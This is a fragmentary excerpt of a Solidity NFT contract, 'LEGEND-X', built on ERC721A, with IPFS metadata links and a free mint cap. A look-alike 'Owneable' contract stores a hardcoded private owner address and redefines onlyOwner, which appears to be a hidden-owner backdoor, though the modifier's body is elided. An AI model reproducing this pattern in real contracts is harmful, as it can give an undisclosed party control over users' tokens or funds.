 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0x451e5A029023C10d6909B8ADa0B4c2218846b7e8;
    modifier onlyOwner() {
...
contract LEGENDX is ERC721A, Owneable {

    string public baseURI = "ipfs://QmWgQiTsrSJd27UMQEPUHhoorMVC68SW2mhJTuPHfuMjY6/";
    string public contractURI = "ipfs://QmWgQiTsrSJd27UMQEPUHhoorMVC68SW2mhJTuPHfuMjY6/";
    ...
    uint256 public constant FREE_MAX_SUPPLY = 3000;
    ...
    constructor() ERC721A("LEGEND-X", "LEGEND") {}
